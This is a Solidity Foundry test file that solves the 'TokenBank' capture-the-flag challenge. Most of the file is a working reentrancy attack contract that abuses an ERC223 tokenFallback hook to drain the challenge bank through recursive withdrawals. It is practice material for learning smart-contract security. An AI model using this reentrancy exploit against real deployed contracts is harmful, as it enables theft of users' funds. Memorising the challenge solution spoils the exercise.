// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity ^0.6.2;

import {Test, console} from "forge-std/Test.sol";
import {TokenBankChallenge, SimpleERC223Token} from "../../src/4-Miscellaneous/2-TokenBank.sol";

contract TokenBankTest is Test {
    address player;

    address challengeAddress;

    function setUp() public {
        player = makeAddr("player");
        TokenBankChallenge challenge = new TokenBankChallenge(payable(player));
        challengeAddress = payable(address(challenge));
    }

    function testSolveTokenBank() public {
        TokenBankChallenge challenge = TokenBankChallenge(payable(challengeAddress));
        SimpleERC223Token token = SimpleERC223Token(challenge.token());

        // [START]

        vm.startPrank(player);

        uint256 meAmount = 500000 * 10 ** 18;

        challenge.withdraw(meAmount);

        // 1. Deploy attack contract
        TokenBankAttack attacker = new TokenBankAttack(payable(challengeAddress));

        // console.log("bank balance: ", address(challenge).balance);
        // console.log("attacker balance: ", address(attacker).balance);

        challenge.token().transfer(address(attacker), meAmount);

        attacker.deposit();

        attacker.attack();

        vm.stopPrank();

        // [END]

        assertTrue(challenge.isComplete());
    }
}

// Attack contract
contract TokenBankAttack {
    TokenBankChallenge public target;

    constructor(address _target) public {
        target = TokenBankChallenge(_target);
    }

    function deposit() external payable {
        uint256 balance = target.token().balanceOf(address(this));

        target.token().transfer(address(target), balance);
    }

    function attack() external payable {
        withdraw();

        require(target.isComplete(), "challenge not completed");
    }

    function tokenFallback(address from, uint256 value, bytes memory data) external {
        require(msg.sender == address(target.token()), "Must be token contract");

        // If is EOA deposit, ignore
        if (from != address(target)) return;

        withdraw();
    }

    function withdraw() private {
        uint256 balance = target.balanceOf(address(this));

        uint256 remainingBalance = target.token().balanceOf(address(target));

        bool keepRecursing = remainingBalance > 0;

        if (keepRecursing) {
            uint256 toWithdraw = balance < remainingBalance ? balance : remainingBalance;
            target.withdraw(toWithdraw);
        }
    }
}
